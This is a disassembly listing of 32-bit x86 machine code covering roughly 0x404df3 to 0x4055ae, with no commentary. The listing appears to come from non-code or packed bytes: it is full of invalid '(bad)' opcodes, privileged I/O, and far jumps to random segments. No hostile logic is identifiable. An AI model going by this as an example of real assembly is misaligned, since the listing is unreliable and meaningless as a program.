  404df3:	mov    bh,0x8a
  404df5:	mov    edx,0x2110c9f1
  404dfa:	enter  0xcf57,0x88
  404dfe:	xor    di,WORD PTR [ecx+0x370b9aa7]
  404e05:	mov    dl,0x3e
  404e07:	sub    BYTE PTR [ecx],al
  404e09:	shr    BYTE PTR [ebx+0x48d084bc],0xaa
  404e10:	sbb    al,0xaf
  404e12:	sub    ah,BYTE PTR [ebx+edi*8]
  404e15:	mov    ebx,0xe10595ad
  404e1a:	jnp    0x404e70
  404e1c:	retf   0xe781
  404e1f:	mov    cl,0x9a
  404e21:	adc    ah,bl
  404e23:	dec    ecx
  404e24:	stos   DWORD PTR es:[edi],eax
  404e25:	(bad)  
  404e26:	mov    edi,0x41d9f003
  404e2b:	sbb    edi,DWORD PTR [edi]
  404e2d:	bnd data16 ja 0x404e2a
  404e31:	mov    ah,0xea
  404e33:	ja     0x404ddd
  404e35:	es ds lahf 
  404e38:	aam    0x54
  404e3a:	imul   edx,edx,0xf69ab5e4
  404e40:	js     0x404e9f
  404e42:	(bad)  
  404e43:	and    eax,0xe4d8834c
  404e48:	out    0xa6,eax
  404e4a:	call   0xce85:0xebdbade5
  404e51:	lds    edx,FWORD PTR [ecx+ebx*2+0x79]
  404e55:	jg     0x404df5
  404e57:	push   esp
  404e58:	int    0x6b
  404e5a:	sub    al,0xf5
  404e5c:	push   ss
  404e5d:	dec    eax
  404e5e:	aas    
  404e5f:	mov    cl,0x36
  404e61:	cs push edx
  404e63:	ds pop edx
  404e65:	in     al,0xaa
  404e67:	fisubr DWORD PTR [ebp+0x5f]
  404e6a:	call   0x5f35:0xbcf1e202
  404e71:	repz mov eax,ds:0xc1fc91da
  404e77:	adc    al,0xc3
  404e79:	xchg   ebp,eax
  404e7a:	(bad)  
  404e7c:	gs push ebx
  404e7e:	dec    edi
  404e7f:	sbb    DWORD PTR [esi+0x30fb96ea],edi
  404e85:	xor    DWORD PTR [eax],esp
  404e87:	test   eax,0xafb67bbf
  404e8c:	adc    esi,DWORD PTR [edi-0x11]
  404e8f:	push   0x6ef98a60
  404e94:	jo     0x404e83
  404e96:	mov    dh,0xfc
  404e98:	arpl   WORD PTR [ebp-0x4b],bx
  404e9b:	push   0xa850e6e3
  404ea0:	stos   BYTE PTR es:[edi],al
  404ea1:	cdq    
  404ea2:	lods   eax,DWORD PTR es:[esi]
  404ea4:	shl    eax,1
  404ea6:	mov    al,ds:0x37843a17
  404eab:	aam    0x24
  404ead:	xchg   edi,eax
  404eae:	leave  
  404eaf:	xchg   edi,eax
  404eb0:	mov    ah,0xc2
  404eb2:	into   
  404eb3:	push   esi
  404eb4:	mov    esi,DWORD PTR [esi*4+0x2783b374]
  404ebb:	push   eax
  404ebc:	push   esi
  404ebd:	cmp    ebx,esi
  404ebf:	hlt    
  404ec0:	push   0xbfc89616
  404ec5:	push   ds
  404ec6:	jmp    0x404e4d
  404ec8:	push   es
  404ec9:	push   ebp
  404eca:	cmp    al,0x63
  404ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ecd:	xchg   ebx,eax
  404ece:	or     eax,0xfb1071c4
  404ed3:	mov    al,0x2a
  404ed5:	popa   
  404ed6:	pop    es
  404ed7:	ret    
  404ed8:	stos   DWORD PTR es:[edi],eax
  404ed9:	push   cs
  404eda:	cmp    BYTE PTR [eax-0x319d4375],ch
  404ee0:	and    al,0x28
  404ee2:	ds iret 
  404ee4:	jmp    0x917a:0xd60d6e55
  404eeb:	test   ebp,edi
  404eed:	cld    
  404eee:	pop    ebx
  404eef:	mov    fs,WORD PTR [ebp-0x5405638d]
  404ef5:	sub    esi,DWORD PTR [ecx+0x338c7b89]
  404efb:	test   al,0xdb
  404efe:	(bad)  [ecx+0x1]
  404f01:	ror    DWORD PTR [ebx+0x58debe56],cl
  404f07:	or     BYTE PTR [esi],0xc2
  404f0a:	mov    ds:0x253927e8,al
  404f0f:	loopne 0x404f70
  404f11:	loopne 0x404e9c
  404f13:	inc    edi
  404f14:	pop    eax
  404f15:	stos   BYTE PTR es:[edi],al
  404f16:	int3   
  404f17:	test   al,0xc6
  404f19:	shr    DWORD PTR [ebx],1
  404f1b:	mov    cl,0x5e
  404f1d:	and    DWORD PTR [edx+0x25c6647a],esi
  404f23:	mov    bl,0xe6
  404f25:	stc    
  404f26:	(bad)  
  404f27:	jle    0x404f27
  404f29:	(bad)  
  404f2a:	mov    DWORD PTR gs:[bx+di-0x7],edx
  404f2f:	iret   
  404f30:	mov    al,0xe1
  404f32:	inc    esi
  404f33:	cmp    al,0xb5
  404f35:	dec    ebp
  404f36:	repnz dec edi
  404f38:	dec    edi
  404f39:	jae    0x404f1a
  404f3b:	mov    es,WORD PTR [esi+0x77]
  404f3e:	sar    bh,1
  404f40:	mov    esi,0xcca74cc6
  404f45:	xor    DWORD PTR [edi+0x299fc71e],esp
  404f4b:	or     al,0x72
  404f4d:	sbb    al,0xb6
  404f4f:	xchg   edx,eax
  404f50:	pop    esp
  404f51:	push   0xffffffe3
  404f53:	fnstsw WORD PTR [edi]
  404f55:	and    cl,BYTE PTR [ebx+0x5523afd8]
  404f5b:	push   es
  404f5c:	xor    DWORD PTR [ebx-0x5c],ecx
  404f5f:	sar    DWORD PTR [ebp-0x55],cl
  404f62:	das    
  404f63:	or     ecx,DWORD PTR [eax-0x69]
  404f66:	into   
  404f67:	dec    eax
  404f68:	(bad)  
  404f69:	sbb    eax,0x27399f06
  404f6e:	xlat   BYTE PTR ds:[ebx]
  404f6f:	rol    BYTE PTR [ecx-0x4b],0x19
  404f73:	cmp    ebx,DWORD PTR ds:0x8dfd8c83
  404f79:	adc    ebp,eax
  404f7b:	pop    es
  404f7c:	inc    eax
  404f7d:	rcl    ah,0xf1
  404f80:	xchg   esi,eax
  404f81:	loopne 0x404fa3
  404f83:	xchg   DWORD PTR [esi+0x202dd5be],ebx
  404f89:	jne    0x404f8c
  404f8b:	jnp    0x404fd2
  404f8d:	mov    DWORD PTR [esi+0x1334b0da],0xe8a58cf8
  404f97:	xchg   BYTE PTR [eax+0x21],dl
  404f9a:	add    bl,BYTE PTR [ebp+edi*4-0xa93e6fe]
  404fa1:	outs   dx,BYTE PTR ds:[esi]
  404fa2:	adc    BYTE PTR [eax+ebx*8-0x56b8cd48],dh
  404fa9:	cli    
  404faa:	inc    esp
  404fab:	sub    eax,DWORD PTR [esi]
  404fad:	stc    
  404fae:	inc    eax
  404faf:	addr16 data16 or ch,bl
  404fb3:	(bad)  
  404fb4:	loopne 0x404fc1
  404fb6:	jo     0x404fc3
  404fb8:	stos   BYTE PTR es:[edi],al
  404fb9:	hlt    
  404fba:	(bad)  
  404fbb:	test   al,0x6
  404fbd:	jecxz  0x405021
  404fbf:	in     al,dx
  404fc0:	ja     0x405035
  404fc2:	add    al,0xa
  404fc4:	push   ecx
  404fc5:	stos   DWORD PTR es:[edi],eax
  404fc6:	jmp    0x61b969b9
  404fcb:	push   0x6c19907
  404fd0:	je     0x404ffb
  404fd2:	fsub   QWORD PTR [edi-0x79ac1ca4]
  404fd8:	popf   
  404fd9:	jmp    0x3738:0x4b524458
  404fe0:	(bad)  
  404fe1:	(bad)  
  404fe2:	push   ebp
  404fe3:	mov    cl,bl
  404fe5:	push   edx
  404fe6:	stos   DWORD PTR es:[edi],eax
  404fe7:	ret    0x8a3f
  404fea:	pop    esp
  404feb:	adc    ecx,DWORD PTR [edi+0x77]
  404fee:	mov    ah,0x25
  404ff0:	std    
  404ff1:	ds loopne 0x404fca
  404ff4:	cmp    DWORD PTR [esi+0x0],edi
  404ff7:	jo     0x404ff1
  404ff9:	ss push esi
  404ffb:	push   ds
  404ffc:	out    dx,eax
  404ffd:	dec    edi
  404ffe:	ret    0xf2d7
  405001:	call   0x4ef05660
  405006:	push   edx
  405007:	int    0xe4
  405009:	and    BYTE PTR [ecx+0x1725276d],al
  40500f:	dec    ecx
  405010:	jbe    0x405016
  405012:	leave  
  405013:	pop    eax
  405014:	sub    DWORD PTR [eax+ebx*1+0x45],ebx
  405018:	inc    esi
  405019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40501a:	scas   al,BYTE PTR es:[edi]
  40501b:	scas   al,BYTE PTR es:[edi]
  40501c:	xchg   esi,eax
  40501d:	into   
  40501e:	pusha  
  40501f:	adc    bl,bh
  405021:	cwde   
  405022:	mov    dl,0xfd
  405024:	fwait
  405025:	jb     0x40505e
  405027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405028:	inc    edi
  405029:	out    dx,eax
  40502a:	rcr    BYTE PTR [edx-0x3c],cl
  40502d:	cmp    dl,BYTE PTR [ecx+0x13]
  405030:	bound  ecx,QWORD PTR [ecx]
  405032:	pop    edx
  405033:	xchg   edi,eax
  405034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405035:	xor    ebx,esp
  405037:	xchg   esi,eax
  405038:	in     eax,dx
  405039:	jmp    0x2880c172
  40503e:	jne    0x405033
  405040:	push   ebp
  405041:	lods   al,BYTE PTR ds:[esi]
  405042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405043:	aas    
  405044:	pop    ds
  405045:	in     al,dx
  405046:	jp     0x4050bd
  405048:	and    DWORD PTR [ebp+0x1dd934b],ebx
  40504e:	xchg   sp,ax
  405050:	(bad)  
  405051:	xor    ebx,DWORD PTR [ecx+0x380d3996]
  405057:	sub    dh,BYTE PTR [ebp+ecx*8-0x71]
  40505b:	loopne 0x405003
  40505d:	in     eax,dx
  40505e:	(bad)  
  40505f:	loop   0x40501c
  405061:	ins    DWORD PTR es:[edi],dx
  405062:	arpl   WORD PTR [edx+ebp*1-0x675fd0b7],ax
  405069:	adc    eax,0xc0ce68ff
  40506e:	push   ebp
  40506f:	cmc    
  405070:	das    
  405071:	sub    eax,0xf77dd3b
  405076:	xchg   edi,eax
  405077:	cmc    
  405078:	mov    ah,0x51
  40507a:	jle    0x4050b8
  40507c:	pusha  
  40507d:	push   ebp
  40507e:	scas   al,BYTE PTR es:[edi]
  40507f:	cmp    esi,DWORD PTR [esi-0x374b79ca]
  405085:	push   0xd748769d
  40508a:	test   al,0xeb
  40508c:	int    0xb3
  40508e:	adc    al,0x62
  405090:	lods   eax,DWORD PTR ds:[esi]
  405091:	mov    ds:0xbbdf9803,al
  405096:	fs push ds
  405098:	(bad)  [ebx]
  40509a:	pop    es
  40509b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40509c:	fmul   QWORD PTR [ecx]
  40509e:	push   cs
  40509f:	fist   DWORD PTR [edx]
  4050a1:	jp     0x4050bc
  4050a3:	icebp  
  4050a4:	mov    esi,0xd1a343e5
  4050a9:	adc    eax,0xf9785f9d
  4050ae:	repz mov eax,ds:0xc66e7063
  4050b4:	cs js  0x4050dc
  4050b7:	bound  edi,QWORD PTR [eax-0x23]
  4050ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050bb:	lock xchg edx,eax
  4050bd:	js     0x405081
  4050bf:	fisubr DWORD PTR [esi]
  4050c1:	jns    0x405099
  4050c3:	jbe    0x40513d
  4050c5:	js     0x40508d
  4050c7:	(bad)  
  4050c8:	loope  0x40509b
  4050ca:	iret   
  4050cb:	mov    eax,ds:0x525d7bd4
  4050d0:	popa   
  4050d1:	push   ebx
  4050d2:	and    al,0xa0
  4050d4:	mov    bh,0x1e
  4050d6:	jmp    0x7cbf:0x4dc92e63
  4050dd:	mov    al,0x27
  4050df:	int3   
  4050e0:	jge    0x40509d
  4050e2:	mov    esi,0xa59768db
  4050e7:	pop    edi
  4050e8:	dec    esp
  4050e9:	retf   0xfda5
  4050ec:	scas   al,BYTE PTR es:[edi]
  4050ed:	push   edi
  4050ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050ef:	test   al,0xbd
  4050f1:	shl    DWORD PTR [eax+0x62d609ed],cl
  4050f7:	lea    ebx,[edi+0x66]
  4050fa:	mov    dl,0x20
  4050fd:	xor    bh,bh
  4050ff:	jle    0x40509e
  405101:	and    al,0xb1
  405103:	cmp    al,0x6
  405105:	faddp  st(0),st
  405107:	hlt    
  405108:	pop    es
  405109:	and    ch,0x4f
  40510c:	adc    DWORD PTR [esi*8-0x439b03d8],esi
  405113:	mov    al,ds:0x78866770
  405118:	aas    
  405119:	lods   al,BYTE PTR ds:[esi]
  40511a:	mov    eax,ds:0x38d2703b
  40511f:	push   ss
  405120:	(bad)  
  405121:	test   DWORD PTR [ecx-0x18],0xe15478c8
  405128:	cmc    
  405129:	jmp    0xa077a073
  40512e:	pop    edx
  40512f:	inc    edx
  405130:	test   eax,0xecf22a9a
  405135:	out    dx,eax
  405136:	mov    ds:0x146091cc,eax
  40513b:	test   al,al
  40513d:	xchg   esp,eax
  40513e:	popf   
  40513f:	out    0x10,al
  405141:	inc    esp
  405142:	retf   
  405143:	mov    edx,0x90da46ef
  405148:	shl    DWORD PTR [esi+eax*4],cl
  40514b:	mov    dl,0x4b
  40514d:	pop    edx
  40514e:	dec    esp
  40514f:	add    BYTE PTR [ecx],0x84
  405152:	out    dx,al
  405153:	inc    ebp
  405154:	outs   dx,BYTE PTR ds:[esi]
  405155:	xchg   ebp,eax
  405156:	cdq    
  405157:	mov    ds:0x704bb9ed,al
  40515c:	call   0x644e99e2
  405161:	lock and dh,BYTE PTR [ebp+0x13]
  405165:	rcr    ecx,cl
  405167:	xchg   esp,eax
  405168:	pop    ds
  405169:	and    cl,BYTE PTR [edi+0x8f3b4e3]
  40516f:	jp     0x405149
  405171:	out    dx,al
  405172:	add    al,0x42
  405174:	sbb    BYTE PTR [ecx],cl
  405176:	adc    eax,0xab35700b
  40517b:	mov    al,ds:0x63bf2d5f
  405180:	icebp  
  405181:	repnz fnsave [eax+ebx*4]
  405185:	sar    ebp,cl
  405187:	imul   esp,esi,0xffffffc7
  40518a:	outs   dx,BYTE PTR ds:[esi]
  40518b:	into   
  40518c:	int    0x4e
  40518e:	bound  eax,QWORD PTR [ecx+ebx*2+0x5f]
  405192:	xor    BYTE PTR [ecx+edx*4-0x32a36dbd],0x78
  40519a:	popa   
  40519b:	add    esi,ecx
  40519d:	lods   eax,DWORD PTR ds:[esi]
  40519e:	cli    
  40519f:	mov    edi,0x862a252f
  4051a4:	les    eax,FWORD PTR [esp+esi*2+0x54b536c1]
  4051ab:	jo     0x40519f
  4051ad:	push   eax
  4051ae:	(bad)  
  4051af:	shr    ebx,1
  4051b1:	mov    ds:0x39e97d3d,eax
  4051b6:	out    0xd6,al
  4051b8:	pop    ebp
  4051b9:	and    ebp,ecx
  4051bb:	int    0xe4
  4051bd:	out    dx,eax
  4051be:	rcl    BYTE PTR [ecx],cl
  4051c0:	and    eax,DWORD PTR [ebp+0x0]
  4051c3:	dec    esi
  4051c4:	ret    
  4051c5:	stos   BYTE PTR es:[edi],al
  4051c6:	mov    edi,0x42379eef
  4051cb:	in     al,dx
  4051cc:	imul   al
  4051ce:	pop    eax
  4051cf:	jp     0x4051fb
  4051d1:	push   ebx
  4051d2:	frstor ss:[eax]
  4051d5:	jmp    0xac09:0x95b14794
  4051dc:	aaa    
  4051dd:	imul   BYTE PTR [ebx]
  4051df:	call   0xb5a4:0xf479b40b
  4051e6:	mov    ds:0xf8c8d67e,al
  4051eb:	ins    DWORD PTR es:[edi],dx
  4051ec:	or     al,0x89
  4051ee:	cld    
  4051ef:	mov    dl,0x57
  4051f1:	pop    ebx
  4051f2:	jmp    0x737:0x4d5940d6
  4051f9:	test   DWORD PTR [ebx],esp
  4051fb:	test   dh,dh
  4051fd:	pop    es
  4051fe:	sbb    al,0x7e
  405200:	cmp    edi,esp
  405202:	and    esp,DWORD PTR [edi]
  405204:	sti    
  405205:	ror    DWORD PTR [ebp+0xe0dc005],cl
  40520b:	xchg   esp,eax
  40520c:	out    0xef,al
  40520e:	inc    edi
  40520f:	jle    0x4051b7
  405211:	inc    edi
  405212:	pop    ecx
  405213:	icebp  
  405214:	adc    BYTE PTR [ecx+0x6],dh
  405217:	inc    esp
  405218:	repnz sbb DWORD PTR [esi-0x64a4c9cf],eax
  40521f:	xor    ah,BYTE PTR [ebx]
  405221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405222:	ret    
  405223:	cwde   
  405224:	out    dx,al
  405225:	mov    esi,0xf60adc08
  40522a:	adc    ecx,DWORD PTR [ecx]
  40522c:	adc    eax,0xb0acf629
  405231:	int    0xe9
  405233:	lods   eax,DWORD PTR ds:[esi]
  405234:	jne    0x4051ee
  405236:	sub    dl,BYTE PTR [esi+0x6685fc6d]
  40523c:	aaa    
  40523d:	arpl   WORD PTR [edi-0x7c5da86a],di
  405243:	jge    0x4051eb
  405245:	div    DWORD PTR [ebp+0x2a]
  405248:	loopne 0x4051dc
  40524a:	sbb    eax,0x9bb1a3e4
  40524f:	lods   eax,DWORD PTR ds:[esi]
  405250:	jae    0x405204
  405252:	sub    esi,ebp
  405254:	cmp    DWORD PTR [ecx],ebp
  405256:	jbe    0x4052ca
  405258:	popa   
  405259:	add    eax,DWORD PTR [ebx]
  40525b:	test   BYTE PTR [esi-0x7af953b8],ah
  405261:	outs   dx,BYTE PTR ds:[esi]
  405262:	or     BYTE PTR [ebx+0x5d],dl
  405265:	pop    ebp
  405266:	dec    ebx
  405267:	fdivr  DWORD PTR [ebx]
  405269:	int    0x8
  40526b:	fmul   DWORD PTR [ebp-0x751135d7]
  405271:	repnz mov eax,edi
  405274:	dec    ebp
  405275:	(bad)  
  405276:	add    edi,edi
  405278:	loope  0x4052f1
  40527a:	cmp    BYTE PTR [edx],0x3b
  40527d:	lds    ebx,FWORD PTR [eax+0x5760c323]
  405283:	mov    dh,BYTE PTR [edi+eiz*4]
  405286:	mov    ds:0x4e3ef616,eax
  40528b:	iret   
  40528c:	or     DWORD PTR ds:0x735a6fc8,edx
  405292:	repz sub DWORD PTR [ebp+edi*4+0x69],edi
  405297:	jmp    0x4052b7
  405299:	stos   BYTE PTR es:[edi],al
  40529a:	adc    eax,edi
  40529c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40529d:	xchg   edx,eax
  40529e:	pop    ebp
  40529f:	mov    ds:0x4bd70b1a,eax
  4052a4:	sbb    bl,BYTE PTR [edi-0x5ddabc9a]
  4052aa:	loop   0x40530d
  4052ac:	out    0xdf,eax
  4052ae:	lods   eax,DWORD PTR ds:[esi]
  4052af:	xchg   esi,eax
  4052b0:	jge    0x4052e8
  4052b2:	pop    DWORD PTR [ecx-0x6]
  4052b5:	xchg   edx,eax
  4052b6:	repz inc ebp
  4052b8:	(bad)  
  4052b9:	scas   eax,DWORD PTR es:[edi]
  4052ba:	pop    ebp
  4052bb:	mov    ecx,0x5ea2731b
  4052c0:	and    dl,BYTE PTR gs:[edx-0x10]
  4052c4:	sub    al,0xc4
  4052c6:	not    BYTE PTR ds:0xe57befc7
  4052cc:	pop    es
  4052cd:	jne    0x4052e6
  4052cf:	push   0xe926b9e1
  4052d4:	stc    
  4052d5:	mov    al,0x29
  4052d7:	adc    ebx,ecx
  4052d9:	not    DWORD PTR [edi]
  4052db:	shl    DWORD PTR [ebp+0x68b9fb6c],0xb4
  4052e2:	cmp    DWORD PTR [ebx-0x5b254174],ecx
  4052e8:	push   ebx
  4052e9:	call   0x62a0:0xb3f31f16
  4052f0:	xchg   edx,eax
  4052f1:	add    BYTE PTR [esi+0x2e],0x78
  4052f5:	cmc    
  4052f6:	sub    BYTE PTR [ebx+0x3],bh
  4052f9:	daa    
  4052fa:	jns    0x4052bb
  4052fc:	in     eax,dx
  4052fd:	adc    dh,BYTE PTR [ebx]
  4052ff:	sub    ebp,ebx
  405301:	pop    ecx
  405302:	je     0x40530b
  405304:	lods   eax,DWORD PTR ds:[esi]
  405305:	mov    DWORD PTR [ebp+0x11],ebp
  405308:	inc    ecx
  405309:	jge    0x405334
  40530b:	xor    BYTE PTR ds:0xf83195f0,al
  405311:	mov    dh,0x46
  405313:	(bad)  
  405314:	scas   al,BYTE PTR es:[edi]
  405315:	jge    0x4052cd
  405317:	xchg   esi,eax
  405318:	push   ss
  405319:	(bad)  
  40531a:	in     al,dx
  40531b:	mov    esp,0x635fb577
  405320:	jle    0x4052ff
  405322:	iret   
  405323:	fwait
  405324:	and    dl,BYTE PTR [esi+ebp*1-0x9]
  405328:	mov    BYTE PTR [ebx+0x6b9fb2f5],al
  40532e:	in     eax,0xa
  405330:	mov    eax,ds:0x3e5e682a
  405335:	inc    esi
  405336:	dec    ebx
  405337:	push   0x2a
  405339:	sbb    edi,DWORD PTR [edi]
  40533b:	mov    ch,0x45
  40533d:	sub    BYTE PTR [ebx-0x4f],bl
  405340:	jbe    0x40531c
  405342:	call   0xd9a94c04
  405347:	(bad)  
  405348:	in     al,dx
  405349:	pusha  
  40534a:	dec    edi
  40534b:	fmul   st,st(2)
  40534d:	cmp    eax,0xb79f512f
  405352:	and    ch,dh
  405354:	adc    BYTE PTR [edx-0x6e69203c],0x7
  40535b:	scas   eax,DWORD PTR es:[edi]
  40535c:	mov    al,0x9c
  40535e:	arpl   WORD PTR [eax+0x77ea6978],bp
  405364:	test   DWORD PTR [eax+0x1b94048d],0x6f1279f
  40536e:	xchg   edi,eax
  40536f:	add    eax,0x8fbfd365
  405374:	repz out 0xd1,eax
  405377:	(bad)  
  40537a:	clc    
  40537b:	mov    ds:0x91956dc,al
  405380:	mov    dl,0xa1
  405382:	sbb    al,0x22
  405384:	lea    ebp,[edi+0x3f3d8759]
  40538a:	(bad)  
  40538b:	xlat   BYTE PTR ds:[ebx]
  40538c:	and    BYTE PTR [edi-0x6172cbb1],ch
  405392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405393:	sbb    eax,0x10ee98aa
  405398:	xor    dh,bl
  40539a:	dec    esp
  40539b:	and    BYTE PTR [ebp+0x1d],al
  40539e:	xchg   ebp,eax
  40539f:	rcl    DWORD PTR [ebp-0x3a702ec5],1
  4053a5:	cmp    eax,0x504d8bf1
  4053aa:	cmp    eax,0x6445b90
  4053af:	adc    eax,0x9bee2611
  4053b4:	leave  
  4053b5:	xor    bh,BYTE PTR [esi+0x4562e8]
  4053bb:	dec    ebx
  4053bc:	push   es
  4053bd:	push   edi
  4053be:	outs   dx,DWORD PTR ds:[esi]
  4053bf:	aaa    
  4053c0:	int    0x29
  4053c2:	cmp    ah,dl
  4053c4:	cmp    ecx,DWORD PTR [esi-0x5]
  4053c7:	inc    edx
  4053c8:	jns    0x40540e
  4053ca:	jbe    0x4053bb
  4053cc:	daa    
  4053cd:	in     eax,dx
  4053ce:	fisubr WORD PTR [esp+edx*2]
  4053d1:	and    ebp,DWORD PTR [ebx-0x1]
  4053d4:	mov    esp,0xa58e0767
  4053d9:	adc    BYTE PTR [ebx-0x2492563c],bh
  4053df:	daa    
  4053e0:	or     al,0xb8
  4053e2:	cmp    dl,BYTE PTR [ebx]
  4053e4:	pop    esp
  4053e5:	cmc    
  4053e6:	dec    ebp
  4053e7:	or     ecx,ecx
  4053e9:	out    dx,eax
  4053ea:	icebp  
  4053eb:	(bad)  
  4053ec:	fadd   DWORD PTR [edi]
  4053ee:	push   ecx
  4053ef:	fsubr  st(2),st
  4053f1:	gs in  al,dx
  4053f3:	sub    al,0x55
  4053f5:	mov    ds:0x878e6cef,eax
  4053fa:	jae    0x405393
  4053fc:	call   0x45b:0xc7d10cc
  405403:	popa   
  405404:	pop    es
  405405:	and    eax,0xda4f6efa
  40540a:	dec    ecx
  40540b:	pop    edi
  40540c:	stc    
  40540d:	int3   
  40540e:	adc    edx,ebx
  405410:	int3   
  405411:	push   ecx
  405412:	add    eax,0xdbf27579
  405417:	add    ah,bl
  405419:	and    BYTE PTR [ebx+0x76],dl
  40541c:	xchg   edi,eax
  40541d:	outs   dx,DWORD PTR ds:[esi]
  40541e:	mov    eax,ds:0xa6e0cc6e
  405423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405424:	sbb    al,0x69
  405426:	pop    ecx
  405427:	gs div dh
  40542a:	dec    esp
  40542b:	data16 std 
  40542d:	push   edi
  40542e:	repnz sar DWORD PTR [edi-0x67d5d97d],0x15
  405436:	arpl   WORD PTR [edx],ax
  405438:	inc    esi
  405439:	aaa    
  40543a:	jo     0x4053fb
  40543c:	mov    edi,DWORD PTR [ebp+ecx*8+0x5daf31cf]
  405443:	inc    esi
  405444:	test   cl,cl
  405446:	js     0x4054c2
  405448:	lods   eax,DWORD PTR ds:[esi]
  405449:	sbb    esi,DWORD PTR [esi-0x35]
  40544c:	sub    bl,al
  40544e:	in     eax,dx
  40544f:	sti    
  405450:	push   esi
  405451:	pop    eax
  405452:	(bad)
  405456:	popa   
  405457:	in     eax,0xe1
  405459:	stc    
  40545a:	adc    al,dl
  40545c:	ret    
  40545d:	js     0x4053ed
  40545f:	ret    
  405460:	dec    ebp
  405461:	fwait
  405462:	mov    ah,cl
  405464:	cdq    
  405465:	int3   
  405466:	or     BYTE PTR [esi],ah
  405468:	pushf  
  405469:	jle    0x405475
  40546b:	inc    esp
  40546c:	sbb    esp,DWORD PTR [ebx]
  40546e:	mov    dl,0x70
  405470:	mov    edi,gs
  405472:	cdq    
  405473:	mov    WORD PTR [ebp+0xe],fs
  405476:	dec    esi
  405477:	cmp    al,0xb6
  405479:	cmp    edi,esi
  40547b:	cmp    al,0xae
  40547d:	(bad)  
  40547e:	cld    
  40547f:	and    eax,0xeabf268b
  405484:	frstor [edx]
  405486:	out    dx,al
  405487:	push   ss
  405488:	add    BYTE PTR [ebx-0x70712af],dh
  40548e:	adc    ebx,esi
  405490:	pop    esp
  405491:	int3   
  405492:	push   ds
  405493:	loop   0x4054db
  405495:	jecxz  0x40550a
  405497:	or     BYTE PTR [ecx+eax*2-0x3b],ch
  40549b:	imul   ecx,DWORD PTR [ecx],0xffffffc8
  40549e:	(bad)  
  4054a0:	sub    eax,eax
  4054a2:	push   esi
  4054a3:	pop    eax
  4054a4:	std    
  4054a5:	ds pop ds
  4054a7:	push   es
  4054a8:	icebp  
  4054a9:	xlat   BYTE PTR ds:[ebx]
  4054aa:	popa   
  4054ab:	inc    edi
  4054ac:	or     esi,ebx
  4054ae:	shl    BYTE PTR [edx+eiz*4],0xf4
  4054b2:	add    esp,0x859cfce2
  4054b8:	mov    BYTE PTR [edx+0x36e79739],al
  4054be:	add    esi,DWORD PTR [eax-0x1c]
  4054c1:	mov    eax,ds:0xddffa158
  4054c6:	test   bl,dl
  4054c8:	mov    al,0x10
  4054ca:	aas    
  4054cb:	dec    BYTE PTR [ebx-0x4019e221]
  4054d1:	or     esi,0x70
  4054d4:	jl     0x405536
  4054d6:	fsubr  DWORD PTR [esi]
  4054d8:	jb     0x405485
  4054da:	int    0x3a
  4054dc:	sar    edi,0xff
  4054df:	mov    al,BYTE PTR ds:0xc046c266
  4054e5:	mov    dh,0xca
  4054e7:	add    ah,cl
  4054e9:	call   0xfff2:0x19b3ce03
  4054f0:	pop    es
  4054f1:	in     eax,0xbf
  4054f3:	mov    ds:0x3bb5396b,al
  4054f8:	or     al,0x6c
  4054fa:	in     al,0x33
  4054fc:	sbb    al,0xe0
  4054fe:	ficomp WORD PTR ds:0xb657fea2
  405504:	xchg   ebp,eax
  405505:	mov    bh,BYTE PTR [esi-0x48]
  405508:	aas    
  405509:	idiv   ebx
  40550b:	ret    0xcdf6
  40550e:	aad    0xd6
  405510:	pop    ss
  405511:	std    
  405512:	xchg   esp,eax
  405513:	sub    eax,edi
  405515:	and    BYTE PTR [ebx],bh
  405517:	and    al,0xf0
  405519:	jge    0x4054f2
  40551b:	push   0xffffff97
  40551d:	aas    
  40551e:	shr    BYTE PTR [ebp+0x11ec7598],0x46
  405525:	jo     0x4054e9
  405527:	sbb    BYTE PTR [eax+edi*2],0x66
  40552b:	js     0x23bc9d6
  405531:	adc    al,0xb9
  405533:	mov    BYTE PTR [ebp-0x1d425bc6],cl
  405539:	jne    0x4054e8
  40553b:	call   DWORD PTR [edx]
  40553d:	pop    ebp
  40553e:	jmp    0x3393:0xb06edeec
  405545:	repz and DWORD PTR ds:0x39b7b6f0,ebx
  40554c:	pusha  
  40554d:	div    DWORD PTR [ebx-0x22]
  405550:	jnp    0x4054ff
  405552:	imul   edx,DWORD PTR [esi+eiz*8-0x2b],0x40b24dc7
  40555a:	imul   esp,DWORD PTR [edi],0xffffffe6
  40555d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40555e:	xor    dh,dh
  405560:	inc    esi
  405561:	loopne 0x4055a3
  405563:	dec    edi
  405564:	call   0x998:0xbe0f1ac0
  40556b:	inc    edi
  40556c:	inc    esp
  40556d:	jecxz  0x405500
  40556f:	retf   0x29ce
  405572:	retf   
  405573:	in     eax,dx
  405574:	scas   al,BYTE PTR es:[edi]
  405575:	in     eax,dx
  405576:	fadd   st(1),st
  405578:	ins    DWORD PTR es:[edi],dx
  405579:	inc    esi
  40557a:	xchg   edi,eax
  40557b:	add    DWORD PTR [edi+ebx*4],edi
  40557e:	xchg   BYTE PTR [ebp-0x1f341ea],cl
  405584:	lods   eax,DWORD PTR ds:[esi]
  405585:	ins    DWORD PTR es:[edi],dx
  405586:	adc    eax,eax
  405588:	in     eax,dx
  405589:	mov    ebp,0x7e9f413d
  40558e:	push   ebp
  40558f:	dec    dx
  405591:	dec    edi
  405592:	push   0x152282f5
  405597:	popf   
  405598:	nop
  405599:	pop    ss
  40559a:	fimul  DWORD PTR [ebp-0x2e]
  40559d:	mov    al,ds:0xd7a4893e
  4055a2:	adc    ecx,eax
  4055a4:	cmp    ch,BYTE PTR [edi+ebp*1-0x58]
  4055a8:	cli    
  4055a9:	(bad)  
  4055ab:	push   ebx
  4055ac:	xor    al,0x3d
  4055ae:	push   0xffffffbe
